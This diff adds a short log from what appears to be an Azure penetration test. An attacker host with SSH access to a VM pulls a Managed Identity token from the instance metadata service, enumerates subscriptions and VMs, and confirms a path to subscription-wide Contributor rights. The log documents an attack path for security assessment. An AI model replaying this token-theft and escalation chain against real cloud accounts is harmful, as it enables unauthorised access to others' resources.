@@ -1,0 +1,14 @@
+[*] target VM: <VM_PUBLIC_IP>
+[*] acting from external attacker host with SSH access
+[*] Step 1: query IMDS for Managed Identity token (ARM-scoped)
+[+] token acquired
+    client_id (MI):     <MI_CLIENT_ID>
+    token length:       2055 chars
+    expires_in:         86300s
+[*] Step 2: enumerate subscriptions accessible to this token
+[+] subscription accessible: Azure for Students (<SUBSCRIPTION_ID>)
+[*] Step 3: perform a Contributor-scope action (list all VMs in subscription)
+[+] enumerated 1 VM(s) at subscription scope
+[*] Step 4: inspect role assignments held by this MI
+
+[+] Path Z1 verified: VM IMDS -> MI token -> subscription-scope Contributor
